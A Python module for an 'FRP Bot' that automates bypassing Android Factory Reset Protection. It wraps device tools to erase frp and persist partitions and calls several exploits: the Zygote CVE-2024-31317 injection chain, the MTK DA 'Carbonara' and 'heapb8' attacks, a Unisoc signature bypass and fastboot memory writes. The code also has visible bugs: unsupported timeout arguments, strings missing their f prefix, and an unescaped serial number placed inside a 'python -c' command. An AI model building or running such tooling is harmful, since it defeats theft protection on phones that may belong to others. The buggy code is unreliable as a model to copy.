#!/usr/bin/env python3
"""
FRP Bot — Tool Executor Wrappers
Each wrapper provides a consistent interface: execute(device, params) → (success, output, error)
"""

import logging
import os
import subprocess
import time
from abc import ABC, abstractmethod
from dataclasses import dataclass
from pathlib import Path
from typing import Any

logger = logging.getLogger(__name__)


@dataclass
class ExecutionResult:
    success: bool
    output: str
    error: str
    duration_sec: float
    artifacts: list[str] = None  # paths to backup files, logs, etc.

    def __post_init__(self):
        if self.artifacts is None:
            self.artifacts = []


class BaseExecutor(ABC):
    """Abstract base for tool executors"""

    def __init__(self, tool_name: str, timeout: int = 300):
        self.tool_name = tool_name
        self.timeout = timeout
        self.binary_path = self._find_binary()

    @abstractmethod
    def _find_binary(self) -> str | None:
        pass

    @abstractmethod
    def execute(self, device_info: dict[str, Any], params: dict[str, Any]) -> ExecutionResult:
        pass

    def _run_cmd(self, cmd: list[str], cwd: str | None = None, env: dict | None = None) -> ExecutionResult:
        start = time.time()
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=self.timeout,
                cwd=cwd,
                env={**os.environ, **(env or {})}
            )
            return ExecutionResult(
                success=result.returncode == 0,
                output=result.stdout,
                error=result.stderr,
                duration_sec=time.time() - start,
            )
        except subprocess.TimeoutExpired:
            return ExecutionResult(
                success=False,
                output="",
                error=f"Timeout after {self.timeout}s",
                duration_sec=self.timeout,
            )
        except Exception as e:
            return ExecutionResult(
                success=False,
                output="",
                error=str(e),
                duration_sec=time.time() - start,
            )


import os


class MTKClientExecutor(BaseExecutor):
    """Wrapper for bkerler/mtkclient"""

    def _find_binary(self) -> str | None:
        candidates = ["mtk", "python -m mtkclient", "python3 -m mtkclient"]
        for c in candidates:
            try:
                subprocess.run(c.split() + ["--help"], capture_output=True, timeout=5)
                return c
            except Exception:
                continue
        return None

    def execute(self, device_info: dict[str, Any], params: dict[str, Any]) -> ExecutionResult:
        if not self.binary_path:
            return ExecutionResult(False, "", "mtkclient not found. Install: pip install mtkclient", 0)

        func = params.get("function", "erase_partitions")
        base_cmd = self.binary_path.split()

        if func == "erase_partitions":
            partitions = params.get("partitions", ["frp", "persist"])
            # Backup first
            backup_results = []
            for part in partitions:
                backup_cmd = base_cmd + ["r", part, f"{part}.img"]
                logger.info(f"Backing up {part}: {' '.join(backup_cmd)}")
                result = self._run_cmd(backup_cmd)
                backup_results.append(result)
                if not result.success:
                    logger.warning(f"Backup failed for {part}: {result.error}")

            # Erase partitions
            erase_cmd = base_cmd + ["e"] + partitions
            logger.info(f"Erasing partitions: {' '.join(erase_cmd)}")
            result = self._run_cmd(erase_cmd)

            if result.success:
                result.artifacts = [f"{p}.img" for p in partitions]

            return result

        if func == "printinfo":
            cmd = base_cmd + ["printinfo"]
            return self._run_cmd(cmd)

        if func == "read_partitions":
            partitions = params.get("partitions", ["frp", "persist"])
            cmd = base_cmd + ["rl", "./mtk_dump"]
            return self._run_cmd(cmd)

        return ExecutionResult(False, "", f"Unknown function: {func}", 0)


class EDLExecutor(BaseExecutor):
    """Wrapper for bkerler/edl (Qualcomm EDL/Sahara/Firehose)"""

    def _find_binary(self) -> str | None:
        for c in ["edl", "python -m edl", "python3 -m edl"]:
            try:
                subprocess.run(c.split() + ["--help"], capture_output=True, timeout=5)
                return c
            except Exception:
                continue
        return None

    def execute(self, device_info: dict[str, Any], params: dict[str, Any]) -> ExecutionResult:
        if not self.binary_path:
            return ExecutionResult(False, "", "edl not found. Install: pip install edl", 0)

        func = params.get("function", "erase_frp")
        base_cmd = self.binary_path.split()

        if func == "erase_frp":
            partitions = params.get("partitions", ["frp", "persist"])
            results = []
            for part in partitions:
                # Try to read first (backup)
                read_cmd = base_cmd + ["r", part, f"{part}.img"]
                logger.info(f"Backing up {part}: {' '.join(read_cmd)}")
                read_result = self._run_cmd(read_cmd)
                results.append(read_result)

                # Erase
                erase_cmd = base_cmd + ["e", part]
                logger.info(f"Erasing {part}: {' '.join(erase_cmd)}")
                erase_result = self._run_cmd(erase_cmd)
                results.append(erase_result)

            # Overall success if all erases succeeded
            all_success = all(r.success for r in results[1::2])  # every other is erase
            return ExecutionResult(
                success=all_success,
                output="\n".join(r.output for r in results),
                error="\n".join(r.error for r in results if not r.success),
                duration_sec=sum(r.duration_sec for r in results),
                artifacts=[f"{p}.img" for p in partitions],
            )

        if func == "printgpt":
            cmd = base_cmd + ["printgpt"]
            return self._run_cmd(cmd)

        if func == "enable_adb":
            cmd = base_cmd + ["enableadb"]
            return self._run_cmd(cmd)

        return ExecutionResult(False, "", f"Unknown function: {func}", 0)


class NPhoneKITExecutor(BaseExecutor):
    """Wrapper for nPhoneKIT / nPhoneCLI"""

    def _find_binary(self) -> str | None:
        # Discovery must not import nPhoneCLI: it opens serial ports at import.
        from importlib.util import find_spec
        if find_spec("nphonecli") is not None:
            return "nphonecli"
        # Check for GUI entry point
        for c in ["nphonekit", "python -m nphonekit", "python3 -m nphonekit"]:
            try:
                subprocess.run(c.split() + ["--help"], capture_output=True, timeout=5)
                return c
            except Exception:
                continue
        return None

    def execute(self, device_info: dict[str, Any], params: dict[str, Any]) -> ExecutionResult:
        func = params.get("function", "frp_unlock_2024")

        if self.binary_path == "nphonecli":
            # Use Python API
            return self._execute_python_api(func, params)
        # CLI fallback
        return self._execute_cli(func, params)

    def _execute_python_api(self, func: str, params: dict[str, Any]) -> ExecutionResult:
        start = time.time()
        try:
            from nphonecli import nPhoneCLI
            cli = nPhoneCLI()

            method_map = {
                "frp_unlock_2024": cli.frp_unlock_2024,
                "frp_unlock_2022_2023": cli.frp_unlock_2022_2023,
                "frp_unlock_pre2022": cli.frp_unlock_pre2022,
                "reboot_download_sam": cli.reboot_download_sam,
                "wifitest": cli.wifitest,
                "lg_screen_unlock": cli.lg_screen_unlock,
                "moto_frp": cli.moto_frp,
            }

            if func not in method_map:
                return ExecutionResult(False, "", f"Unknown nPhoneCLI function: {func}", time.time() - start)

            verbose = params.get("verbose", True)
            result = method_map[func](verbose=verbose)

            return ExecutionResult(
                success=True,
                output=str(result),
                error="",
                duration_sec=time.time() - start,
            )
        except Exception as e:
            return ExecutionResult(
                success=False,
                output="",
                error=f"{type(e).__name__}: {e}",
                duration_sec=time.time() - start,
            )

    def _execute_cli(self, func: str, params: dict[str, Any]) -> ExecutionResult:
        # nPhoneKIT GUI doesn't have great CLI — prefer Python API
        return ExecutionResult(False, "", "nPhoneCLI Python package required. Install: pip install git+https://github.com/nlckysolutions/nPhoneCLI", 0)


class FRPFreedomExecutor(BaseExecutor):
    """Wrapper for youngrichu/frp-freedom"""

    def _find_binary(self) -> str | None:
        # frp-freedom is a Python package
        try:
            import frp_freedom
            return "frp_freedom"
        except ImportError:
            pass
        # Check for CLI
        for c in ["frp-freedom", "python -m frp_freedom", "python3 -m frp_freedom"]:
            try:
                subprocess.run(c.split() + ["--help"], capture_output=True, timeout=5)
                return c
            except Exception:
                continue
        return None

    def execute(self, device_info: dict[str, Any], params: dict[str, Any]) -> ExecutionResult:
        func = params.get("function", "auto_detect_bypass")

        if self.binary_path == "frp_freedom":
            return self._execute_python_api(device_info, func, params)
        return self._execute_cli(device_info, func, params)

    def _execute_python_api(self, device_info: dict[str, Any], func: str, params: dict[str, Any]) -> ExecutionResult:
        start = time.time()
        try:
            # frp-freedom API varies — use CLI as primary for now
            return self._execute_cli(device_info, func, params)
        except Exception as e:
            return ExecutionResult(False, "", str(e), time.time() - start)

    def _execute_cli(self, device_info: dict[str, Any], func: str, params: dict[str, Any]) -> ExecutionResult:
        # Build CLI command based on function
        base_cmd = self.binary_path.split()

        if func == "auto_detect_bypass":
            cmd = base_cmd + ["--auto", "--device", device_info.get("serial", "")]
        elif func == "adb_exploit_setupwizard":
            cmd = base_cmd + ["--method", "adb_setupwizard", "--device", device_info.get("serial", "")]
        elif func == "mtk_bypass_exploit":
            cmd = base_cmd + ["--method", "mtk_bypass", "--device", device_info.get("serial", "")]
        elif func == "qualcomm_edl_exploit":
            cmd = base_cmd + ["--method", "edl", "--device", device_info.get("serial", "")]
        elif func == "odin_mode_exploit":
            cmd = base_cmd + ["--method", "odin", "--device", device_info.get("serial", "")]
        else:
            return ExecutionResult(False, "", f"Unknown frp-freedom function: {func}", 0)

        return self._run_cmd(cmd)


class KirinToolkitExecutor(BaseExecutor):
    """Wrapper for huawei_kirin_toolkit (CLI at ~/frp-tools/Huawei-Kirin-Flash-and-Repair-Toolkit/cli.py)"""

    def _find_binary(self) -> str | None:
        # Actual install location from the frp-tools download
        candidates = [
            str(Path.home() / "frp-tools" / "Huawei-Kirin-Flash-and-Repair-Toolkit" / "cli.py"),
            str(Path.home() / "huawei_kirin_toolkit" / "cli.py"),
            "/opt/huawei_kirin_toolkit/cli.py",
        ]
        for c in candidates:
            if Path(c).exists():
                return c
        return None

    def execute(self, device_info: dict[str, Any], params: dict[str, Any]) -> ExecutionResult:
        if not self.binary_path:
            return ExecutionResult(False, "", "kirin_toolkit not found. See ~/frp-tools/Huawei-Kirin-Flash-and-Repair-Toolkit/", 0)

        func = params.get("function", "fastboot_ram_hijack")

        if func == "fastboot_ram_hijack":
            # Prefer the toolkit's own fastboot patch runner (kirin710-protect);
            # it emits the same three `fastboot oem write@...` commands via fastboot CLI.
            addresses = params.get("addresses", [])
            values = params.get("values", [])
            if len(addresses) != len(values):
                return ExecutionResult(False, "", "addresses and values length mismatch", 0)

            # Build fastboot oem write commands directly (no GUI dependency)
            cmds = []
            for addr, val in zip(addresses, values):
                cmds.append(["fastboot", "oem", f"write@{addr}@{val}"])

            results = []
            for cmd in cmds:
                logger.info(f"Executing: {' '.join(cmd)}")
                result = self._run_cmd(cmd)
                results.append(result)
                if not result.success:
                    break

            return ExecutionResult(
                success=all(r.success for r in results),
                output="\n".join(r.output for r in results),
                error="\n".join(r.error for r in results if not r.success),
                duration_sec=sum(r.duration_sec for r in results),
            )

        if func == "flash_board_software":
            # Delegate to the toolkit CLI's write-partitions subcommand
            cmd = ["python3", self.binary_path, "write-partitions"]
            return self._run_cmd(cmd)

        return ExecutionResult(False, "", f"Unknown function: {func}", 0)


class SPDClientExecutor(BaseExecutor):
    """Wrapper for SPDClient (Unisoc/Spreadtrum)"""

    def _find_binary(self) -> str | None:
        for c in ["spd.py", "python -m spdclient", "python3 -m spdclient"]:
            try:
                subprocess.run(c.split() + ["--help"], capture_output=True, timeout=5)
                return c
            except Exception:
                continue
        return None

    def execute(self, device_info: dict[str, Any], params: dict[str, Any]) -> ExecutionResult:
        if not self.binary_path:
            return ExecutionResult(False, "", "SPDClient not found. Install in Termux or Linux.", 0)

        func = params.get("function", "erase_frp_partition")
        base_cmd = self.binary_path.split()

        if func == "erase_frp_partition":
            partition = params.get("partition", "frp")
            cmd = base_cmd + ["erase", "--partition", partition]
            return self._run_cmd(cmd)

        if func == "bypass_signature":
            addr = params.get("address", "0x5500")
            cmd = base_cmd + ["bypass", "--address", addr]
            return self._run_cmd(cmd)

        return ExecutionResult(False, "", f"Unknown function: {func}", 0)


class SamsungFRBWebExecutor(BaseExecutor):
    """Wrapper for NDXCode/Samsung-FRP-Bypass-WEB (WebSerial/WebUSB)"""

    def _find_binary(self) -> str | None:
        # This runs in browser — we can't directly execute
        # But we can launch the local server
        candidates = [
            str(Path.home() / "Samsung-FRP-Bypass-WEB" / "index.html"),
        ]
        for c in candidates:
            if Path(c).exists():
                return c
        return None

    def execute(self, device_info: dict[str, Any], params: dict[str, Any]) -> ExecutionResult:
        # Return instructions for manual browser execution
        return ExecutionResult(
            success=False,
            output="",
            error="Samsung-FRP-Bypass-WEB runs in browser. Open index.html in Chrome/Edge, connect via WebSerial/WebUSB, follow UI steps.",
            duration_sec=0,
        )


# ─── Zygote CVE-2024-31317 Executor ───
class ZygoteExecutor(BaseExecutor):
    """Executes Zygote injection exploit (CVE-2024-31317) for ADB-based FRP bypass.
    Works on Android 9–14, SPL ≤ 2024-06-01. No root required."""

    def _find_binary(self) -> str | None:
        zygote_dir = Path.home() / "frp-tools" / "zygote-cve-2024-31317"
        if (zygote_dir / "cve_2024_31317.py").exists():
            return str(zygote_dir / "cve_2024_31317.py")
        return None

    def execute(self, device_info: dict, params: dict) -> ExecutionResult:
        if not self.binary_path:
            return ExecutionResult(False, "", "Zygote toolkit not installed at ~/frp-tools/zygote-cve-2024-31317", 0)

        func = params.get("function", "inject_and_extract")
        zygote_dir = Path(self.binary_path).parent

        # Set up environment with JDK17 + Android SDK
        env = os.environ.copy()
        jdk17 = "/tmp/jdk17/jdk-17.0.21.1+2"
        if Path(jdk17).exists():
            env["JAVA_HOME"] = jdk17
            env["PATH"] = f"{jdk17}/bin:{env.get('PATH', '')}"
        env["ANDROID_HOME"] = str(Path.home() / "android-sdk")

        if func == "build_apk":
            # Build the carrier APK (verified working, no phone needed)
            return self._run_cmd(
                ["python3", "-c", "import cve_2024_31317 as c; c.build_apk(force=True)"],
                cwd=str(zygote_dir), env=env
            )

        if func == "inject_and_extract":
            # Full exploit: build APK → push → install → inject → extract
            # Requires ADB connection to vulnerable device
            serial = device_info.get("serial")
            target_pkg = params.get("target_pkg", "com.android.settings")
            mode = params.get("mode", "interactive")

            # Step 1: Build APK
            build_result = self._run_cmd(
                ["python3", "-c", "import cve_2024_31317 as c; c.build_apk(force=True)"],
                cwd=str(zygote_dir), env=env
            )
            if not build_result.success:
                return build_result

            # Step 2: Run exploit script
            cmd = ["python3", "-c", f"import cve_2024_31317 as c; c.run_exploit(serial='{serial or ''}', target='{target_pkg}', mode='{mode}')"]
            return self._run_cmd(cmd, cwd=str(zygote_dir), env=env, timeout=120)

        if func == "enable_adb":
            # Enable ADB from download mode (Samsung-specific)
            return self._run_cmd(
                ["python3", "-c", "import cve_2024_31317 as c; c.enable_adb_download_mode()"],
                cwd=str(zygote_dir), env=env
            )

        return ExecutionResult(False, "", f"Unknown function: {func}", 0)


# ─── Penumbra Executor (MTK DA exploits) ───
class PenumbraExecutor(BaseExecutor):
    """Executes Penumbra MTK DA exploits (Carbonara, heapb8/heapbait).
    Works on MTK V5/V6 in BROM/preloader mode."""

    def _find_binary(self) -> str | None:
        # Check if penumbra is installed in venv or standalone
        for path in [
            Path.home() / "frp-tools" / "penumbra",
            Path.home() / "frp-bot" / "venv" / "lib" / "python3.14" / "site-packages" / "penumbra",
        ]:
            if path.exists():
                return str(path)
        return None

    def execute(self, device_info: dict, params: dict) -> ExecutionResult:
        if not self.binary_path:
            return ExecutionResult(False, "", "Penumbra not installed. Clone: github.com/shomykohai/penumbra", 0)

        func = params.get("function", "erase_frp")

        if func == "erase_frp":
            # Penumbra can erase FRP via DA exploit
            cmd = ["python3", "-m", "penumbra", "erase", "--partition", "frp"]
            return self._run_cmd(cmd, timeout=180)

        if func == "carbonara_hash_overwrite":
            # Carbonara: DA2 hash-slot overwrite
            cmd = ["python3", "-m", "penumbra", "carbonara", "--target", "da2", "--action", "overwrite_hash"]
            return self._run_cmd(cmd, timeout=120)

        if func == "heapb8_overflow":
            # heapb8: DA2 AIO signature heap overflow
            cmd = ["python3", "-m", "penumbra", "heapb8", "--exploit", "aio_sig_overflow"]
            return self._run_cmd(cmd, timeout=120)

        return ExecutionResult(False, "", f"Unknown function: {func}", 0)


# ─── Valhalla Executor (Motorola MTK BL unlock + FRP) ───
class ValhallaExecutor(BaseExecutor):
    """Executes Valhalla/VAL Protocol for Motorola MTK devices.
    Unlocks bootloader and erases FRP on MediaTek Motorolas."""

    def _find_binary(self) -> str | None:
        valhalla = Path.home() / "frp-tools" / "valhalla"
        if valhalla.exists():
            return str(valhalla)
        return None

    def execute(self, device_info: dict, params: dict) -> ExecutionResult:
        if not self.binary_path:
            return ExecutionResult(False, "", "Valhalla not installed at ~/frp-tools/valhalla", 0)

        func = params.get("function", "unlock_and_erase")

        if func == "unlock_and_erase":
            # Full: unlock BL → erase FRP
            cmd = ["python3", "valhalla.py", "--unlock", "--erase-frp"]
            return self._run_cmd(cmd, cwd=self.binary_path, timeout=300)

        if func == "erase_frp":
            cmd = ["python3", "valhalla.py", "--erase-frp"]
            return self._run_cmd(cmd, cwd=self.binary_path, timeout=180)

        return ExecutionResult(False, "", f"Unknown function: {func}", 0)


# ─── SamFw Server Executor (paid, Samsung download-mode FRP reset) ───
class SamFwServerExecutor(BaseExecutor):
    """Interfaces with SamFw server for Samsung download-mode FRP reset.
    Requires credits (paid service). Works on all SPLs, Android 12-16."""

    def _find_binary(self) -> str | None:
        # SamFw is a Windows GUI tool — we can only document the flow
        return None

    def execute(self, device_info: dict, params: dict) -> ExecutionResult:
        return ExecutionResult(
            False, "",
            "SamFw server is a paid Windows GUI tool. Manual workflow:\n"
            "1. Put Samsung in Download mode (Vol- + Home + Power)\n"
            "2. Open SamFw FRP Tool on Windows PC\n"
            "3. Click 'FRP Bypass' → server-based reset\n"
            "4. Costs ~$15-30 per reset via credits\n"
            "Alternative free: try Samsung FRP Web (WebSerial) or Zygote CVE-2024-31317",
            0
        )


# ─── Hardware ISP Executor (EasyJTAG/Medusa — hardware bridge) ───
class HardwareISPExecutor(BaseExecutor):
    """Bridges to hardware ISP boxes (EasyJTAG Plus, Medusa Pro II).
    Requires physical ISP connection + Windows software."""

    def _find_binary(self) -> str | None:
        # These are hardware boxes with Windows software — no Linux binary
        return None

    def execute(self, device_info: dict, params: dict) -> ExecutionResult:
        tool = "EasyJTAG Plus" if "easyjtag" in self.tool_name else "Medusa Pro II"
        return ExecutionResult(
            False, "",
            f"{tool} is a hardware ISP box with Windows software.\n"
            "Workflow:\n"
            "1. Desolder/dismount UFS/eMMC chip or use ISP pads\n"
            "2. Connect to ISP box via USB\n"
            "3. Open {tool} software on Windows\n"
            "4. Select chipset → erase FRP/persistent/misc partitions\n"
            "5. Resolder chip or reassemble phone\n"
            "Cost: ${tool == 'EasyJTAG Plus' and '$400-600 box' or '$800-1200 box'}\n"
            "Bench cost if outsourced: $600-900",
            0
        )


# Registry
EXECUTORS = {
    "mtkclient": MTKClientExecutor,
    "mtk_studio": MTKClientExecutor,  # Same backend
    "edl": EDLExecutor,
    "nphonekit": NPhoneKITExecutor,
    "frp_freedom": FRPFreedomExecutor,
    "kirin_toolkit": KirinToolkitExecutor,
    "spd_client": SPDClientExecutor,
    "spd_flasher_apk": SPDClientExecutor,  # Different UI, same backend
    "unisoc_tools": SPDClientExecutor,  # Different tool, similar protocol
    "cve_2022_38694": SPDClientExecutor,
    "spd_research_tool": SPDClientExecutor,
    "samsung_frp_web": SamsungFRBWebExecutor,
    "fu_frp": FRPFreedomExecutor,  # Similar ADB-based approach
    "zygote_cve_2024_31317": ZygoteExecutor,
    "penumbra": PenumbraExecutor,
    "valhalla": ValhallaExecutor,
    "samfw_server": SamFwServerExecutor,
    "easyjtag_plus": HardwareISPExecutor,  # Hardware bridge
    "medusa_pro_2": HardwareISPExecutor,   # Hardware bridge
    "sigma": None,  # Proprietary dongle — no open executor
}


def get_executor(tool_name: str) -> BaseExecutor | None:
    """Get executor instance for tool"""
    cls = EXECUTORS.get(tool_name)
    if cls is None:
        return None
    return cls(tool_name)


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)

    # Quick test
    for name in ["mtkclient", "edl", "nphonekit", "frp_freedom", "kirin_toolkit", "spd_client"]:
        exe = get_executor(name)
        status = "FOUND" if exe and exe.binary_path else "MISSING"
        print(f"{name:20s} : {status} ({exe.binary_path if exe else 'N/A'})")
